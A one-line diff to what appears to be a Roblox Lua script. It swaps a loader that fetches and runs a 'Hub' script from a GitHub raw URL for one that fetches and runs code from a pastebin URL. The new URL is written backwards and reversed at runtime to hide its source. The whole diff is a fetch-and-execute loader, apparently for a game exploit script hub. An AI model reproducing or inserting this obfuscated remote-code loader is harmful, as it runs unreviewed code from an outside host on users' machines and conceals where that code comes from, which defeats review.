@@ -1,1 +1,1 @@
- loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pojken123/Hub/main/Hub')))()
+ script=loadstring(game:HttpGet(('ei9rQPRe/war/moc.nibetsap//:sptth'):reverse(), true))()
